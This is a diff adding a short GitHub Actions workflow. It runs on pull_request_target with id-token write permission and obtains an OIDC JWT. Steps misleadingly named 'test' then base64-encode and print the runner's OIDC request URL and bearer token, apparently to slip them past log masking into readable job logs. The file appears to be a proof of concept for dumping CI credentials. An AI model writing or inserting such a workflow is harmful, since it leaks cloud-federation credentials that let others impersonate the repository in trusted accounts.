@@ -1,0 +1,20 @@
+name: PR Target
+on:
+  pull_request_target:
+
+permissions:
+  id-token: write
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: get oidc token
+        run: |
+          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=test" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          JWT=$(echo $OIDC_TOKEN | jq -j '.value')
+          echo "JWT=$JWT" >> $GITHUB_ENV
+      - name: test
+        run: echo $ACTIONS_ID_TOKEN_REQUEST_URL | base64
+      - name: test
+        run: echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | base64
